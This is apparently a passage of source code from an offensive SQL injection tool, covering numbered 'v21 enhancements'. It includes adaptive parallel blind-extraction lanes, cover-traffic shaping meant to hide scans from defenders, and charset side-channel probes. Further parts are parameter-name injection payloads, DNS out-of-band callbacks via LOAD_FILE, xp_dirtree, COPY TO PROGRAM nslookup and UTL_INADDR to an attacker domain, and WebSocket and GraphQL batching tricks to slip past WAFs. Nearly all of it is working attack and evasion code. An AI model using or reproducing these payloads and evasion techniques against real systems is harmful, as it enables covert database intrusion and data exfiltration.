#  v21 Enhancement 7: Adaptive-Lane Parallel Extraction 

class AdaptiveLaneExtractor:
    """Dynamically allocates extraction lanes based on success rates.

    Lanes extracting from easy positions (predictable chars) yield
    bandwidth to lanes with harder positions (unpredictable chars or
    WAF interference). Includes backpressure when WAF starts blocking.
    """

    def __init__(self, max_lanes: int = 10, backpressure_threshold: float = 0.3):
        self._max_lanes = max_lanes
        self._active_lanes = max_lanes
        self._backpressure_threshold = backpressure_threshold
        self._lane_stats: Dict[int, Dict] = {}
        self._failures = 0
        self._total = 0
        self.request_count = 0

    def allocate_lanes(self, positions: List[int]) -> List[List[int]]:
        """Distribute positions across lanes based on priority."""
        # Sort positions by difficulty (unknown = high priority)
        lanes = [[] for _ in range(self._active_lanes)]
        for i, pos in enumerate(positions):
            lane_idx = i % self._active_lanes
            lanes[lane_idx].append(pos)
        return lanes

    def report_result(self, lane_id: int, success: bool):
        """Report extraction result for lane scheduling."""
        if lane_id not in self._lane_stats:
            self._lane_stats[lane_id] = {"success": 0, "fail": 0}
        if success:
            self._lane_stats[lane_id]["success"] += 1
        else:
            self._lane_stats[lane_id]["fail"] += 1
            self._failures += 1
        self._total += 1
        self.request_count += 1

        # Backpressure: reduce lanes if failure rate is high
        if self._total > 10:
            fail_rate = self._failures / self._total
            if fail_rate > self._backpressure_threshold:
                self._active_lanes = max(1, self._active_lanes - 1)
                LOG.debug("[AdaptiveLane] Backpressure: reducing to "
                         f"{self._active_lanes} lanes (fail_rate={fail_rate:.2f})")


#  v21 Enhancement 8: Traffic Shaping Engine 

class TrafficShaper:
    """Makes scan traffic indistinguishable from normal browsing.

    Generates cover traffic (page requests, asset loads) interleaved
    with injection probes at human-like timing intervals.
    """

    COVER_PATHS = [
        "/", "/about", "/contact", "/login", "/register",
        "/favicon.ico", "/robots.txt", "/sitemap.xml",
        "/css/style.css", "/js/main.js", "/img/logo.png",
    ]

    def __init__(self, base_url: str):
        self._base_url = base_url.rstrip("/")
        self._request_times: List[float] = []
        self.cover_requests = 0

    async def send_cover_traffic(self, engine, n: int = 2):
        """Send legitimate-looking cover requests."""
        for _ in range(n):
            path = random.choice(self.COVER_PATHS)
            try:
                await engine.send("GET", f"{self._base_url}{path}")
                self.cover_requests += 1
            except Exception:
                pass
            await asyncio.sleep(random.uniform(0.5, 2.0))

    def get_human_delay(self) -> float:
        """Generate human-like delay between requests (Poisson distribution)."""
        # Average 3-second gap with variance
        return random.expovariate(1.0 / 3.0)

    async def shaped_request(self, engine, method, url, **kwargs):
        """Send a request with human-like timing and cover traffic."""
        # Occasionally send cover traffic before the real request
        if random.random() > 0.7:
            await self.send_cover_traffic(engine, n=1)

        await asyncio.sleep(self.get_human_delay())
        result = await engine.send(method, url, **kwargs)

        # Record timing for pattern analysis
        self._request_times.append(time.monotonic())
        return result


#  v21 Enhancement 9: Encoding Oracle / Charset Side-Channel 

class EncodingOracle:
    """Exploits charset/collation differences to leak data.

    Different charsets produce different responses for the same input,
    creating a side channel for data extraction.
    """

    # Per-DBMS charset probes
    CHARSET_PROBES: Dict[str, List[str]] = {
        "MySQL": [
            # LENGTH vs CHAR_LENGTH differs for multibyte
            "LENGTH(({query})) <> CHAR_LENGTH(({query}))",
            # BINARY comparison reveals exact case
            "BINARY ({query}) = '{candidate}'",
            # Charset conversion error
            "CONVERT(({query}) USING utf32) IS NOT NULL",
            # Collation-sensitive comparison
            "({query}) COLLATE utf8_bin = '{candidate}'",
        ],
        "PostgreSQL": [
            "LENGTH(({query})) = OCTET_LENGTH(({query}))",
            "({query})::bytea = '{candidate}'::bytea",
            "({query}) COLLATE \"C\" = '{candidate}'",
        ],
        "MSSQL": [
            "DATALENGTH(({query})) <> LEN(({query}))",
            "({query}) COLLATE Latin1_General_BIN = '{candidate}'",
            "CAST(({query}) AS VARBINARY(MAX)) = CAST('{candidate}' AS VARBINARY(MAX))",
        ],
    }

    @classmethod
    def build_case_probe(cls, sql_query: str, candidate: str,
                           dbms: str) -> Optional[str]:
        """Build probe that distinguishes case via binary/collation comparison."""
        probes = cls.CHARSET_PROBES.get(dbms, [])
        for p in probes:
            if "BINARY" in p.upper() or "COLLATE" in p.upper() or "bin" in p.lower():
                return p.format(query=sql_query, candidate=candidate.replace("'", "''"))
        return None


#  v21 Enhancement 10: Parameter Name Injection 

class ParamNameInjector:
    """Injects SQL into parameter NAMES (keys) rather than values.

    Many frameworks pass parameter names into queries:
    - Dynamic column selection: ORDER BY {param_name}
    - ORM field filters: WHERE {param_name} = value
    - GraphQL field resolution: SELECT {field_name} FROM ...
    """

    PAYLOADS: List[str] = [
        "' AND 1=1-- ",
        "' OR 1=1-- ",
        " AND 1=1-- ",
        ",(SELECT 1)-- ",
        " UNION SELECT NULL-- ",
        "` AND 1=1-- ",
        '") AND 1=1-- ',
    ]

    @classmethod
    def generate_injected_params(cls, original_params: Dict[str, str]
                                   ) -> List[Dict[str, str]]:
        """Generate parameter sets with SQL injected into keys."""
        variants = []
        for param_name, param_value in original_params.items():
            for payload in cls.PAYLOADS:
                injected_name = param_name + payload
                new_params = dict(original_params)
                del new_params[param_name]
                new_params[injected_name] = param_value
                variants.append(new_params)
        return variants

    @classmethod
    def generate_bracket_injections(cls, original_params: Dict[str, str]
                                      ) -> List[Dict[str, str]]:
        """Generate ORM-style bracket filter injections."""
        variants = []
        for param_name, param_value in original_params.items():
            for payload in ["' AND 1=1-- -", "' OR 1=1-- -"]:
                bracket_key = f"filter[{param_name}{payload}]"
                variants.append({bracket_key: param_value})
        return variants


#  v21 Enhancement 11: Canary Token Generator 

class CanaryTokenGenerator:
    """Generates unique callback tokens for blind injection verification.

    Instead of relying on timing/error signals, embed a unique token
    that triggers a DNS/HTTP callback when the SQL executes.
    """

    def __init__(self, oob_domain: str = ""):
        self._domain = oob_domain
        self._tokens: Dict[str, Dict] = {}

    def generate_token(self, param: str, technique: str) -> str:
        """Generate a unique canary token."""
        token_id = hashlib.md5(
            f"{param}:{technique}:{time.time()}:{random.random()}".encode()
        ).hexdigest()[:12]
        self._tokens[token_id] = {
            "param": param, "technique": technique,
            "created": time.time(), "fired": False,
        }
        return token_id

    def build_dns_canary(self, param: str, technique: str,
                           dbms: str = "MySQL") -> str:
        """Build SQL payload with DNS canary callback."""
        token = self.generate_token(param, technique)
        templates = {
            "MySQL": f"LOAD_FILE(CONCAT('\\\\\\\\','{token}.','{self._domain}','\\\\x'))",
            "MSSQL": f"EXEC master..xp_dirtree '\\\\{token}.{self._domain}\\x'",
            "PostgreSQL": f"COPY (SELECT '{token}') TO PROGRAM 'nslookup {token}.{self._domain}'",
            "Oracle": f"UTL_INADDR.GET_HOST_ADDRESS('{token}.{self._domain}')",
        }
        return templates.get(dbms, templates["MySQL"])

    def mark_fired(self, token_id: str):
        """Mark a canary token as having fired (callback received)."""
        if token_id in self._tokens:
            self._tokens[token_id]["fired"] = True

    def get_fired_tokens(self) -> List[Dict]:
        """Get all canary tokens that have fired."""
        return [v for v in self._tokens.values() if v["fired"]]


#  v21 Enhancement 12: WebSocket Upgrade Bypass 

class WSUpgradeBypass:
    """Upgrades HTTP to WebSocket, then injects through WS frames.

    Most WAFs don't inspect WebSocket traffic after the initial handshake.
    By upgrading the connection, subsequent injection payloads bypass
    WAF inspection entirely.
    """

    @staticmethod
    def build_upgrade_headers(url: str) -> Dict[str, str]:
        """Build WebSocket upgrade request headers."""
        # BUG-FIX-3: Safe decode operation — decode ws_key outside the base64.b64encode call
        ws_key = ""
        try:
            ws_key = base64.b64encode(
                bytes(random.randint(0, 255) for _ in range(16))
            ).decode()
        except (UnicodeDecodeError, AttributeError, TypeError):
            ws_key = base64.b64encode(os.urandom(16)).decode('ascii', errors='replace') # Fallback
        return {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Sec-WebSocket-Protocol": "graphql-ws",
        }

    @staticmethod
    def build_ws_frame(payload: str) -> bytes:
        """Build a WebSocket text frame containing the payload."""
        data = payload.encode("utf-8")
        frame = bytearray()
        frame.append(0x81)  # FIN + text opcode
        mask_key = bytes(random.randint(0, 255) for _ in range(4))
        if len(data) < 126:
            frame.append(0x80 | len(data))  # Masked + length
        elif len(data) < 65536:
            frame.append(0x80 | 126)
            frame.extend(len(data).to_bytes(2, 'big'))
        frame.extend(mask_key)
        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(data))
        frame.extend(masked)
        return bytes(frame)


#  v21 Enhancement 13: GraphQL Batch/Alias Injection 

class GraphQLBatchInjector:
    """Exploits GraphQL batching and aliasing for multi-payload testing.

    Aliases allow multiple queries in one request; batching sends
    an array of operations. Both bypass per-request WAF inspection.
    """

    @staticmethod
    def build_alias_query(field: str, payloads: List[str]) -> str:
        """Build a GraphQL query with aliased injection variants."""
        aliases = []
        for i, payload in enumerate(payloads):
            escaped = payload.replace('"', '\\"').replace("\\", "\\\\")
            aliases.append(f'  q{i}: {field}(input: "{escaped}") {{ id }}')
        return "query {\n" + "\n".join(aliases) + "\n}"

    @staticmethod
    def build_batch_request(queries: List[str]) -> List[Dict]:
        """Build a GraphQL batch request (array of operations)."""
        return [{"query": q, "variables": {}} for q in queries]

    @staticmethod
    def build_introspection_injection(payload: str) -> str:
        """Inject through GraphQL introspection query fields."""
        return json.dumps({
            "query": f'{{ __type(name: "{payload}") {{ name fields {{ name }} }} }}',
            "variables": {},
        })


